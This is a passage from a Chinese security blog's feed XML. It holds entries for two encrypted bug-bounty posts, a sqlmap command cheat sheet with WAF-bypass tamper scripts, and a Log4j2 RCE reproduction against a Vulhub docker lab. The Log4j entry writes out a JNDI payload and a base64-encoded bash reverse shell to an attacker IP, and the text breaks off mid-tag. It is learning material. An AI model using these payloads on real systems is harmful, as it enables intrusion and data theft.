data-hmacdigest="bc231d927611dcb03e35f1fbd80a9283e2b3630401c00c9f653eb0df08451f40">79f62f86255ea1d3dd7c997965f28b50788164d5ea2c73b7b2964199d798616fc9b8cf2dff296bc45ee942fe779cc5ea15ed5c924dacfc842dea0a567b6affce91256574965380639042dec60e16c9716e6b5b6c8080583a929a5d18f9d0be00533fa9657fba41f0cb0b105339e38fa20df181046170d1038d237375fef5a65a6047e37c57ad53d644d001cc6fd7b66765efd07f2c0e70d31af2ac1990b9ffd942a16030d3377bf4a641107d2dfadf237848e5213fc474af24a5951fd588536ee0f86eed8dedeb844d95a1d8001d93bf9c365639aaa45da3bf9aff942bf7b9c4c6b37230941106820f0f45e1b638d45e125d669d58a9632d18e03a3c66538e34b3a2b94fa3f3439a202b911048f9272eb27d266f8a0bb3d07c4f84933209315e1c1b7eee3d3ed95182d55dad48c9073a48d3e995f39252497281d45e94bc9144d3d77b135649a8311f909d8f09212ce767df7edb63a581c65c7332b3b355a64848952619249de377179d8f5a9cfdee7c35d1e05d9b3e5b9c9b5cb4841158634a4c4340f794f8f14551cbad2402b87c6165ad9f82381159c98964744ccb44fe75a60162fb631fd840e361576d60fa82ccc5f4e679c0c5ea17822ec232251dc97d9ced2570f536a2fb2d29b7d2830a693cffba3fd3c16f75e5f94c618475a9cac2462018b7aac3dbb121ee5df9013b32d7d773560b2eb7ff478f791f6c81a97c1d0a136832ca76ee320a07ae060ef7e32072be617acadb82e92c1d9145e4806ef5e02c541d010905059edca0d016aaf096f030119f1121f041d653de985a1a6cc55f9c668c983410ae6da09fc02d79c4e4c3d57f7ecf6750e38fddc774512500bf5ba21323d9eb52b2fc672c0d192fd4d2fd061f91eea5535163eb7b26f22663baae18cd7d56d19e03e35f0dd2b91ec8636e92376873e350d8068095455ed8b69f91d386b568dc450a61cbebcfbfc606586b04e727d485902eec8f4d8e9be57a237cc43388c3897f31708ede0a6a04ad7a3d5cd10d7ec05b1b9f9f753a3027a5ab405289ca29a8e4db4e387d689b791db68d820d115c86a380136dbcd5d0cf718f5acdb543675689ddaf8e00876a8d74f7453ed468a370cea1f54db7bac49dbf4f0cd3dc9cd2b4ca0c20c262f64318c0ae35a891fd6e50fccf22bc7ece707f83c246a94b0ceb1eab6e47614210f4d5f028604b2e83a6b1eb057dc28f64b7c0c5324fb7acff4f2ee4f0199f4f1e7918e2b0a3d9be7cfc931d98b06e0cc93c8b4919b7fe371fcba9377fe7326f6a62d49c30368f160a7477658557bcdcb6125b853db179ad9b4c94473dd10e4346ac479e63c5f90e74ce1c35292a9b3842e12e8f797066d8e0a6041625e77b5aed1cb1adf84a4f518099a5e80b3c6a91d7aedbd6ddf2424ad8d2d8e36a2553a16586bd6df7e4699d71a597e554fcde6d6c7ce4c5f8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">实验室内部查看。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> src </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息泄露 </tag>
            
            <tag> EDUSRC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>edusrc_sql注入_长沙某学院</title>
      <link href="/2023/03/09/%E9%95%BF%E6%B2%99%E6%9F%90%E5%AD%A6%E9%99%A2/"/>
      <url>/2023/03/09/%E9%95%BF%E6%B2%99%E6%9F%90%E5%AD%A6%E9%99%A2/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="00290d783de94b252ab6c6da7f0711fa718a81da95c00ee9016949a011ac96e5">79f62f86255ea1d3dd7c997965f28b5022aa183d8d602e8d62fda15d81a00b7d3c93bd1a31c1424c1de8d8f9370354e951f86117ebac3618966d8141e244e178f11a3a440071720df890a39e685bd5566ef0d58c0ce47325f630cdd90d523bbff012bd492db62e73d53dc91a9ee55125f0ad3547616d69a326fac2e669bb7c509a6414388a55fa5dbf3a80cee2f44d69b37a2dd731f2b03fb7ce3968c72cabb6bd6e14e1572416243702067d9e728be6ab95b2e9c5ad7fa8796ccd70638df1b600276dccbb959c77f1de6f956188933a44b415aca5a0d05a6e305360ab9a20c73c3c021c4c6cf02a033ce676851a9ffadcbe5a5043e6183269681976def7eabde7a5867a57aa55b9e03e6fdd95600315597bde4da9db6d63c894b41616cf14b36e76b55c99d2acfae29b0cffd7d8f0d178360f09f8802a66d3852437b0fa88a499a5571ed8c1434d26221f10345a5d6d65b936d9b2f70a920a7218c4d9f14c1e30caf96a5335cc43dfcff37b76010be8ced5af86c6cd60bf913e63f5a6fab7691248d821b6938daf28c3d7c081e0df3d611521210dd3009be28b3bb09522b77c63f47dfd3b6c8350fd5c55a9c90325862151c8bfe0a95462584475f1f750a521847e524a9a4e18315d7561240c80458545aa09e5f794000bba52c2d4edd51294d7397224260ebf991b20c65b9fa52f73e157cf7b094502a746f2eb56e4cc86ffb627dde79162ac7ad2a2b29713fe0aa767399eb574b69f65c1d6970f058b7eb05393bbcdbd53e28185343cba09aab9c1a6edc1dd263bc872a3e562e3060855be97ee8e7adf6fb59b9a6ec1ad27d3f95fccf4cd33bc05af7dbf1e7c91627c3eaacba1d0414ff898473a42cc566d11b2d9361b8d7001c9c7339c5da38a9870965aecbadc92a167fab6c189ad58c249e28dd0e533f8f640fed1121fabe43db1714cbd0a4f49efc129f4e888aa616d0c6abf7a88add9d36b29ff1572f032ddac8985b50a337c689ce0f865eb7dfc1194b15377ae9374be42bfadef7abe432f262649134dfaac34e8f6b5b7d3563c8ea7e7b3f1414d3367c6ac46c80949725544cac142b26f3c4e898082011eea88447d336ecf86968d9eb461bdd45866a1841003d8949f36c1ffd63d328b7a19a8deea03259966e16ddb0528e2a5a4db12acefac71b3acd7acbdd5f050c3513a8024a2d6aa3832ed4bfa960c9239040138f65fdfd2569d92aed73e5687a64bb4efbe69bbf6c91e7caf4b09f5ed1eab43d2d6f6574d015c859b36f66f715b6087cbf49a4f3a036c0e22b432f9e3941520fb76f047a69d2e327c0b672282e380e2338372f41ba6c820591ea5b404cf5721587d7a7c8039536b9e9f678a9221cadac101c738b1a98a9c8d074f67d92e00d3754c09419351745f78e8835c4b9cd22df9e2f298e6de688977c6f26794f636c0efbcb2f47e0706a2fd30ab44ca18f301cf3139498d8d2a69620caabe15aefdfa633cbbd30a00a1d3c6f7b78b912f18ad21551f503a31c583ce0c62be88b5bc31da2aed3d53b9e67be61783f909487a58d8a981684c3e08585e9e2eaa50df06875631232098266e8862ce00ac2228270ae605b86952da88fcca56b976cd8702232062dce7382db93d4bfecbf6a1310919e2307defced4606325b4faf6e17a3202f19a9a02e658cc654dfb83efc6293472b265e1ee2a31aab68031ac3feac35518314cb02a9f22a6962492127424f2a7fe32a9516547b22812456dcb3c7f88d47091035295cb945441509f414104847834cf1f1737891c3af0ab1f931f44182d30c259e3373a656d57809e28ea23dd7391ee094333427f89f46a915f6131954d3ef790a78d5080607dde930f88bd91249fbd7839402ac2b695c30e2492f9b373c059d11af0c938cb46c3536c9b57278b6733eb390c2e8a4cc9649de8ef2bea967de9d0b554ddec05fbea51a107df1d20b36d7f99af6a2aba8f31ed27da0b8de7fb87b18e101ec34cc74032cb6a418d51da8364cf6247d68d606648f74ead4f155ded9a616d7cde7dc7852006528032e84e919aa22913283527915d7010bc97408f630ff8edcb41f8482d10fcba8c87bea062ffc8a8ce175b87ce197c3c163abc09e296c00c7be9dd3d496debb12f5b0daf12482a963e2ba4277d790df29bf1d84302c2f8f02ae407206c1694e49881c45b4618b92f98032735806c4f1ba7d06d6cf11ed84619fc5d2f056dd1bab3e728e0f53b7590f0e32d142166cd4dde2139be5181c514fed77950753cba3ad6e9569569a55a622335cb304ff6a0a6f47c6bb3a5d107016c7cfeaa29f5796131c0c96aa7c815b51de196367323a182dabe607f8be701a247571a8603c37ee873a63635b3899682b8f3ac5037795ad508bd8e0747cae7bb014c267500666e461187f332a0ee9e5d0422a8076f389094e84599bfe94ae505346f4fa7434691f8b6158534cf917ff66e3adfc9eff17b0ebb27c03b968e14b17bff715e5a7836714adb4a32152c07d86874a560aebc9e3d1e718d8d811b7f94a11ae2fcd60f9b694fe0ce63daf6d39b9f8162bde613d57cbb72f225295da768437b657ace5d66c91498f0d54a5c8df00129ebba34b03e3eb2ec51da6efffe030158c3ae66939a4d71b982de6a73b7c50806cd3fc0470d480fe9e73cde40891e0fc69832c5137be64fece1439168e16493979345c08597a01429d040f75cb27e553222d7a53b7a303accfae4b5fa43ea2ff105262a04ffb732a0dac9acbe57d99756ed0eb98d4d2520bdd498a13af531065c20e28980ed1556dd02f014934089c51723df709cd14e031114c69f94db4b51ba9fe363ea6b69d71e04b12a7e12e287eb4d7de4459ca13912695b1f36dc43e86161fb9f52ac737b3ef05544269360701f2ef0ae8c3189d11fd8bf9716dd90fca4a21d4fa16bd003da6d11c372bed5754952e89bdbc71dd7238df12e58d75845ad7d260895a854008efbd7a29c8219f683b6508e75fc4366c927d15e4d32f88e14d955b9949f9e30b75200eea6b8b9e7bd7669225132d2ed9654473e02cbe152ef3ef6665f1cfe51f40af1f3cc73573057b48e46749c2e9486ea434c57e0fe9a91a35da82f88dd11832ef427da133ad1cb5569138c088b187af35ef945dadb26bb5647611705351273f4735a12a6522da128fcf6f387b02fd63bdc1c6015edd7ce6783c1bc9e86cff0a7d345dbae63ec3aa4bf23d3b6bea54a8cbfef11ade61b97be4649432ffa3f4fb9ab07fa46f0af0184e25d7cd2207246c3902282bc02832f7d80edd5592ef7a76beda15f8681fe1ddf0fd86e9ecc48ec74cc06070dbe31e18a139ff397c6d1e3b680958f38100e0a91067d26b1b7afa4e09249078be21bb322e0f161c91ad28b44e2b9aa9f934144a819a184db1277d00f35d1c66408fabd6c8973edb03966add186fdf5a668053fcb4364fc80cbc3684b83f4e3376d7ecc59f92c6096aa840b9dc476c518e7842aec9844f0766178f72882430019d2df4c764ae3acd0973f23acdb28bdaf0cb964c2e9aed9d95d303a5fbb7442ae7e13d26cb7eceb5ddd6c720bc69e751c65089622dda16eaec0f62ea9519de23cf404336635b66ac429bd06bd4743c4033b3b4c1e7ec57c5f6531f376ede46dfbd361dd0238ee4ee2e6920f86f7688465f3951b345b2e6cb93953edf80fe01ed546a1d472cac8c756fc3cdc472b0ffd39739463656b73f7ff642853fd1863edfc74e22c81bbcee8af75c22f2f57ff79165b1039fc2121e2e19bf373eb3942bb4623bc71f2ebdef45bb6ccdad79333e91b221b9622c1816967a89e2cedf6073bd93221d6251eb07123cb5ae0725f7c071cd385b4f7db9fcbf62bc427d15fb8a1aadfbc76b07666f87f3007c2e84eaba4801615e590179904dee795d97d6a3d274d932126d15828162720274fbb2363241ef33f647df7a2916fe68eedc165e1dd981d2ef2cdedaf456872af9bd0b2f8033710a05bdd7d271669cd6ac0b2b582c00d05c0ca4cab0e6453dd3890660cf421fc935b30f5e26ded8657503a495cd9f590a56bbc077d9cf0279cdc554274a3742160f39155660bd323fad9e7fe641c92cb3b033be3fc929c31d16db4b5392c20a247d605fd32e6a451f62740e3c736d4a463561e3cc92e1f72768ad49a4013721024cd0c4aebbdbc521b3c7d16bc099a5b1268608d872e91f922330c27bd6fb2bfcc226c3f5c7026ce89235acaf2739175ab97974c1a14e145fc8615ddd0cc2645df83a55bd4124070de3fbf19d26a48d32da5c83ecf30781ba95c062172db091dff604806acc19469e7e387a6d2889c6d562f1026e13ba4cefdfad009762a947b7ab189e8577eb6cd3ed888444bc69cf499ec5ccc6166ad9b56482bd2dd0fdab03bb4492c5a80d0febfee997462b1afaceeda6b9386e519200fa2942bf4a5a2e7a5bc1252abdb464ea8b7d41c072e8a6336f0c1737722d381a56a89b933bcac094a73ae5b8173949d7ab54ffbcb7a759834a3d3cf3e7a54143a1225fb770a989ad9c1c36de748c393b86c9b7c0ca82c073f1cd32972bd125b17f3cf7e065063f785c0525b5f72d4122352e22f03ce3a41290ee35bd69efba1be25fc966a57c6df61639840433ed56bc0612967aa320d537844590c7f8b43f147feb48cde46f2ce73d9d32af7bd5facfaf3647d3524ee83e5094bd20c0b42941f43766f886eedfe9ed6a0aeab323c3bc6de6c271341ccb3faf768ec24f91e6313abc400479eb343d47f09d28a5975120659505c14ce66474a94511a7357436363c1a51b34bc05bb1bd150107fa0de10a00c0f0cee931a180b4f3d89c0be26f64d0bed595f3f5d95f7fbae5f5ddcb84fce4a444d69db2df5180f12e0710d5ecc9f39a1c308289c56c8e138765178d74faf991dd7c5c4039ca8eace95361b996b88cc4cae7c94f512e4acf1e5272d5f712cdb3b77b1a55f1ee4c33f384ee8ca738fbba4ca3d87783f198a64b055ce4d29ab87a7bf94d524fc3e3b97185283d67111f7d632e26b89ed297d7046c918ff703a0189ebe0b562f016fb772647034c17bcad5403dcba60450edea90c635ff68621bc32bbd8be348eb23a718fcbec429d0d243f6a341a72ef4e7a539eea5365ab73d616e7d7434ae767ca5df6ff2f7e89e58b3e00e27a3843254f4c61ea2d57ba6503522e1625d6fc3221aca29bd5fd67e2202d1ead9fdb678d020ed400f51e043a9b334b85006e35e93fcb267da47590ddee3d9b119e0be6214438dd79d7d9db8d3aba58dcea0d18df0b85b6febd77504800dc7dad3855a99103aafec99bbe5bfd2a58ddc8e6cb1d0b49081e10cc3ebb41ab432e35bf81628c549a579c365e7534bcdb8bbc399ab042ca5c379bba1189a8e13369ced63331008bd49de41d9494d41cab48692ec40fbb162fd74dc4d4474c534a56088366bbd8daf442d1f5eb2201d3009ec68b0770530d4774fcfc4a6967ae27a00cf498642630f8b5e8d456738aea5834a7e4fba5c907c166ab5a9a3d33a4a00840719db8b9dbf9076a23c84ceeefd20abef604e9b7d6c97afd1d80856084618eefcc06d2d1214cbf39e56441d269cbae9d81a3e86dd3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">实验室内部查看。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> src </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EDUSRC </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap命令</title>
      <link href="/2023/03/06/sqlmap%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/03/06/sqlmap%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1>sqlmap</h1><blockquote><p>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-u 指定目标URL (可以是http协议也可以是https协议)<br> <br>-d 连接数据库<br> <br>--dbs 列出所有的数据库<br> <br>--current-db 列出当前数据库<br> <br>--tables 列出当前的表<br> <br>--columns 列出当前的列<br> <br>-D 选择使用哪个数据库<br> <br>-T 选择使用哪个表<br> <br>-C 选择使用哪个列<br> <br>--dump 获取字段中的数据<br> <br>--batch 自动选择yes<br> <br>--smart 启发式快速判断，节约浪费时间<br> <br>--forms 尝试使用post注入<br> <br>-r 加载文件中的HTTP请求（本地保存的请求包txt文件）<br> <br>-l 加载文件中的HTTP请求（本地保存的请求包日志文件）<br> <br>-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试<br> <br>-o 开启所有默认性能优化<br> <br>--tamper 调用脚本进行注入<br> <br>-v 指定sqlmap的回显等级<br> <br>--delay 设置多久访问一次<br> <br>--os-shell 获取主机shell，一般不太好用，因为没权限<br> <br>-m 批量操作<br> <br>-c 指定配置文件，会按照该配置文件执行动作<br> <br>-data data指定的数据会当做post数据提交<br> <br>-timeout 设定超时时间<br> <br>--level 设置注入探测等级<br> <br>--risk 风险等级<br> <br>--identify-waf 检测防火墙类型<br> <br>--param-del=&quot;分割符&quot; 设置参数的分割符<br> <br>--skip-urlencode 不进行url编码<br> <br>--keep-alive 设置持久连接，加快探测速度<br> <br>--null-connection 检索没有body响应的内容，多用于盲注<br> <br>--thread 最大为10 设置多线程<br></code></pre></td></tr></table></figure><h2 id="详解">详解</h2><h3 id="–delay">–delay</h3><p>有些web服务器请求访问太过频繁可能会被防火墙拦截，使用–delay就可以设定两次http请求的延时</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sqlmap -u &quot;保密（URL）&quot; --batch --delay 10<br></code></pre></td></tr></table></figure><h3 id="–safe-url">–safe-url</h3><p>有的web服务器会在多次错误的访问请求后屏蔽所有请求，使用–safe-url 就可以每隔一段时间去访问一个正常的页面。</p><h3 id="–tamper">–tamper</h3><p>语法：–tamper [“脚本名称”]</p><p>当调用多个脚本的时候，脚本之间用逗号隔开，调用的脚本在 sqlmap文件夹下的 tamper 文件夹中</p><h6 id="脚本信息">脚本信息</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">apostrophemask.py       用UTF-8全角字符替换单引号字符<br>apostrophenullencode.py    用非法双字节unicode字符替换单引号字符<br>appendnullbyte.py       在payload末尾添加空字符编码<br>base64encode.py        对给定的payload全部字符使用Base64编码<br>between.py           分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”<br>bluecoat.py          在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”<br>chardoubleencode.py      对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）<br>charencode.py         对给定的payload全部字符使用URL编码（不处理已经编码的字符）<br>charunicodeencode.py      对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）<br>concat2concatws.py      用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例<br>equaltolike.py        用“LIKE”运算符替换全部等于号“=”<br>greatest.py          用“GREATEST”函数替换大于号“&gt;”<br>halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释<br>ifnull2ifisnull.py      用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例<br>lowercase.py         用小写值替换每个关键字字符<br>modsecurityversioned.py    用注释包围完整的查询<br>modsecurityzeroversioned.py  用当中带有数字零的注释包围完整的查询<br>multiplespaces.py       在SQL关键字周围添加多个空格<br>nonrecursivereplacement.py  用representations替换预定义SQL关键字，适用于过滤器<br>overlongutf8.py        转换给定的payload当中的所有字符<br>percentage.py         在每个字符之前添加一个百分号<br>randomcase.py         随机转换每个关键字字符的大小写<br>randomcomments.py       向SQL关键字中插入随机注释<br>securesphere.py        添加经过特殊构造的字符串<br>sp_password.py        向payload末尾添加“sp_password” ``for` `automatic obfuscation ``from` `DBMS logs<br>space2comment.py       用“``/**/``”替换空格符<br>space2dash.py         用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符<br>space2hash.py         用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符<br>space2morehash.py       用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符<br>space2mssqlblank.py      用一组有效的备选字符集当中的随机空白符替换空格符<br>space2mssqlhash.py      用磅注释符“#”其次是一个换行符替换空格符<br>space2mysqlblank.py      用一组有效的备选字符集当中的随机空白符替换空格符<br>space2mysqldash.py      用破折号注释符“--”其次是一个换行符替换空格符<br>space2plus.py         用加号“+”替换空格符<br>space2randomblank.py     用一组有效的备选字符集当中的随机空白符替换空格符<br>unionalltounion.py      用“UNION SELECT”替换“UNION ALL SELECT”<br>unmagicquotes.py       用一个多字节组合%bf%27和末尾通用注释一起替换空格符 宽字节注入<br>varnish.py          添加一个HTTP头“X-originating-IP”来绕过WAF<br>versionedkeywords.py     用MySQL注释包围每个非函数关键字<br>versionedmorekeywords.py   用MySQL注释包围每个关键字<br>xforwardedfor.py       添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF<br></code></pre></td></tr></table></figure><p><img src="/2023/03/06/sqlmap%E5%91%BD%E4%BB%A4/1.png" alt="img"></p><h3 id="v-“x”">-v [“x”]</h3><p>使用sqlmap注入测试时，可以使用 -v [x] 参数来指定回显信息的复杂程度, x 的取值范围为[0~6]:</p><table><thead><tr><th>等级</th><th>解释</th></tr></thead><tbody><tr><td>0</td><td>只显示python错误以及严重信息</td></tr><tr><td>1</td><td>同时显示基本信息和警告信息</td></tr><tr><td>2</td><td>同时显示debug信息</td></tr><tr><td>3</td><td>同时显示注入的pyload</td></tr><tr><td>4</td><td>同时显示HTTP请求</td></tr><tr><td>5</td><td>同时显示HTTP相应头</td></tr><tr><td>6</td><td>同时显示HTTP相应页面</td></tr></tbody></table><h3 id="–level">–level</h3><p>level有5个等级，默认等级为1，进行Cookie测试时使用–level 2 ，进行use-agent或refer测试时使用–level 3 ，进行 host 测试时使用–level 5</p><p>–-os-cmd=[“命令”] 或 --os-shell=[“命令”] 执行系统命令</p><h2 id="sql注入检测">sql注入检测</h2><p>get型：</p><p>语法：sqlmap -u [“url”]</p><p>post型：</p><p>先使用bp把提交的数据包保存下来</p><p>语法：sqlmap -r [“请求包的txt文件”]</p><p>获取当前数据库名称：</p><p>语法：sqlmap -u [“url”] --current-db</p><p>获取当前数据库名称：</p><p>语法：sqlmap -u [“url”] --current-db<br>获取指定数据库指定表中的字段：</p><p>语法：sqlmap -u [“url”] -D [‘数据库名’] -T[‘表名’] --columns</p><p>获取指定数据库指定表的指定字段的字段内容：</p><p>语法：sqlmap -u [“url”] -D [‘数据库名’] -T [‘表名’] -C [‘字段名1,字段名2,…’] --dump</p><p><strong>获取并查看数据库信息</strong></p><p>–dbs                    列出全部数据库</p><p>–current-db               列出当前数据库</p><p>-D 数据库名 --tables        列出指定数据库的所有表</p><p>-D 数据库名 -T 表 --columns  列出指定数据库，指定表里面的所有字段</p><p>-D 数据库名 -T 表 -C “字段” --dump  列出指定字段的所有内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sqlmap -u &quot;保密(URL)&quot; --dbs --batch --delay 5<br></code></pre></td></tr></table></figure><p><strong>设置测试等级</strong></p><p>–current-db 列出当前数据库</p><p>–level</p><p>level有5个等级，默认等级为1</p><p>进行Cookie测试时使用–level 2</p><p>进行use-agent或refer测试时使用–level 3</p><p>进行 host 测试时使用–level 5</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sqlmap -u &quot;保密(URL)&quot;  -level 2 --current-db --batch --delay 5<br></code></pre></td></tr></table></figure><p><strong>Brute force：（暴力）</strong></p><p>–common-tables            暴力破解表</p><p>–common-colomns           暴力破解列</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现log4j2</title>
      <link href="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/"/>
      <url>/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/</url>
      
        <content type="html"><![CDATA[<h1>Log4j2远程代码执行漏洞复现</h1><h1>漏洞描述</h1><blockquote><p>Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就Java的日志记录工具。通过重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。log4j2中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码。</p></blockquote><h2 id="简介">简介</h2><blockquote><p>log4j2中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目 标服务器上执行任意代码。</p></blockquote><h2 id="漏洞范围"><strong>漏洞范围</strong></h2><p>影响组件应用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Spring-Boot-strater-log4j2<br>Apache Struts2<br>Apache Solr<br>Apache Flink<br>Apache Druid<br>ElasticSearch<br>Flume<br>Dubbo<br>Redis<br>Logstash<br>Kafka<br>vmvare<br></code></pre></td></tr></table></figure><h2 id="受影响版本"><strong>受影响版本</strong></h2><p>Apache Log4j 2.x ~ 2.15.0-rc1</p><h2 id="复现环境">复现环境</h2><p>Vulhub 搭建log4j漏洞环境</p><h2 id="环境搭建">环境搭建</h2><p>1.vulhub靶场下载地址: <a href="https://vulhub.org/#/docs/">https://vulhub.org/#/docs/</a><br>2.使用docker搭建vulfocus的漏洞靶场</p><figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">docker pull vulfocus/log4j2-rce-2021-12-09:latest<br>docker run -d -p <span class="hljs-number">80</span>:<span class="hljs-number">8080</span> vulfocus/log4j2-rce-2021-12-09:latest<br></code></pre></td></tr></table></figure><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230131202745343.png" alt="image-20230131202745343"></p><p>3.访问漏洞环境，环境搭建完成。</p><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230131202917476.png" alt="image-20230131202917476"></p><h2 id="漏洞复现">漏洞复现</h2><h3 id="检查漏洞是否存在">检查漏洞是否存在</h3><p>进入我们需要复现的漏洞靶场文件夹下,输入命令 : docker-compose up -d</p><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230131205129179.png" alt="image-20230131205129179"></p><h4 id="利用DNSlog验证漏洞存在">利用DNSlog验证漏洞存在</h4><p>靶场启动成功后，浏览器访问:<br><a href="http://xn--DNSLogvrlxt9-r65tt8pelaqpj05c721a571mlo0b1ob.dnslog.cn">通过DNSLog平台获取到域名vrlxt9.dnslog.cn</a>，构造payload：${jndi:ldap://vrlxt9.dnslog.cn}，浏览器点击???并使用Burpsuite进行抓包并替换payload参数，此时若直接发包会导致服务器400错误:<br><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230131205703682.png" alt="image-20230131205703682"></p><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230131210121403.png" alt="image-20230131210121403"></p><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230131210338396-16778061896521.png" alt="image-20230131210338396"></p><p>编码后再次发送请求包：</p><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230131210747768.png" alt="image-20230131210747768"></p><p>在DNSLog网站成功接收到解析记录</p><h3 id="漏洞利用">漏洞利用</h3><p>这里选用JNDI注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar<br>下载JNDI注入工具JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，下载地址为https://github.com/bkfish/Apache-Log4j-Learning/tree/main<br>应用工具JNDI-Injection-Exploit搭建服务：格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “命令” -A “ip（攻击机）”<br></code></pre></td></tr></table></figure><p>这里的命令是想要靶机运行的命令，-A后放的是发出攻击的电脑的ip，也是存放-C后“命令”的ip地址。<br>接下来要实现反弹shell，可以用命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>注意“命令”必须经过编码，不然将无法实现</p><h4 id="反弹shell漏洞利用">反弹shell漏洞利用</h4><p>在漏洞已经存在的情况下，构造攻击payload执行命令反弹shell</p><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230201144258246.png" alt="image-20230201144258246"></p><h4 id="设置监听端口"><strong>设置监听端口</strong></h4><p>在vps中打开一个页面，监听我们的对应的端口。</p><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230201145109550.png" alt></p><h4 id="执行EXP，生成可用的payload"><strong>执行EXP，生成可用的payload</strong></h4><p>编码后的命令通过-C参数输入JNDI工具，通过通过-A参数指定kali的ip地址：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1NC4xMjkvNTU1NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;” -A 192.168.254.129<br></code></pre></td></tr></table></figure><p><strong>使用burpsuit抓包，替换payload</strong>rmi://xxxx/xz4mwn 到Burpsuite：</p><p>将payload进行url编码并发包</p><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230213083431740.png" alt="image-20230213083431740"></p><p>攻击成功，即为反弹shell成功</p><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230213083409641.png" alt="image-20230213083409641"></p><h2 id="ctfshow靶场">ctfshow靶场</h2><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230227084751508.png" alt="image-20230227084751508"></p><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230227084957676.png" alt="image-20230227084957676"></p><h3 id="check">check</h3><p>首先测试下漏洞是否存在，可以利用dnslog平台检测漏洞是否存在</p><p><a href="http://xn--dnslog-oy7ry56d.cn">访问dnslog.cn</a></p><p><img 